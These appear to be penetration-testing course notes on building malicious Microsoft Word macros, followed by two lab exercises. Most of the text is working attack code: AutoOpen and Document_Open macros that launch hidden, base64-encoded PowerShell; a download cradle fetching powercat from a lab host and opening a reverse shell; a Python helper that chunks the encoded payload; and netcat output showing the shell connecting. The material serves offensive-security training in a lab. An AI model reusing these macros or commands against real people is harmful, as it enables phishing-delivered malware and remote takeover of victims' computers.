# Leveraging Microsoft Word Macros

Default empty macro
>``` shell
>Sub MyMacro()
>'
>' MyMacro Macro
>'
>'
>
>End Sub
>```

Macro opening powershell.exe
>``` shell
>Sub MyMacro()
>
>  CreateObject("Wscript.Shell").Run "powershell"
>  
>End Sub
>```

Macro automatically executing powershell.exe after opening the Document
>``` shell
>Sub AutoOpen()
>
>  MyMacro
>  
>End Sub
>
>Sub Document_Open()
>
>  MyMacro
>  
>End Sub
>
>Sub MyMacro()
>
>  CreateObject("Wscript.Shell").Run "powershell"
>  
>End Sub
>```

Declaring a string variable and provide it as a parameter
>``` shell
>Sub AutoOpen()
>    MyMacro
>End Sub
>
>Sub Document_Open()
>    MyMacro
>End Sub
>
>Sub MyMacro()
>    Dim Str As String
>    CreateObject("Wscript.Shell").Run Str
>End Sub
>```

PowerShell download cradle and PowerCat reverse shell
>``` shell
>IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
>```

Python script to split a base64 encoded PowerShell command string
>``` shell
>str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
>
>n = 50
>
>for i in range(0, len(str), n):
>	print("Str = Str + " + '"' + str[i:i+n] + '"')
>```

Macro invoking PowerShell to create a reverse shell
>``` shell
>Sub AutoOpen()
>    MyMacro
>End Sub
>
>Sub Document_Open()
>    MyMacro
>End Sub
>
>Sub MyMacro()
>    Dim Str As String
>    
>    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
>        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
>        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
>    ...
>        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
>        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
>        Str = Str + "A== "
>
>    CreateObject("Wscript.Shell").Run Str
>End Sub
>```

Reverse shell from Word macro
>``` shell
>kali@kali:~$ nc -nvlp 4444
>listening on [any] 4444 ...
>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
>
>PS C:\Users\offsec\Documents>
>```

Lab 1 - Perform the steps from this section to create a malicious Word document containing a macro with the name MyMacro on the OFFICE (VM #1) machine. For this, you have to install Microsoft Office on VM #1 again as outlined in the section "Installing Microsoft Office". Confirm that the macro works as expected by obtaining a reverse shell from the OFFICE machine. We can log in with offsec:lab. What keyword is used to declare a variable in VBA?
>``` shell
>
>```

Lab 2 - Once you have confirmed that the macro from the previous exercise works, upload the document containing the macro MyMacro in the file upload form (port 8000) of the TICKETS (VM #2) machine with the name ticket.doc. A script on the machine, simulating a user, checks for this file and executes it. After receiving a reverse shell, enter the flag from the flag.txt file on the desktop for the Administrator user. For the file upload functionality, add tickets.com with the corresponding IP address in /etc/hosts. Please note that it can take up to three minutes after uploading the document for the macro to get executed.
>``` shell
>
>```
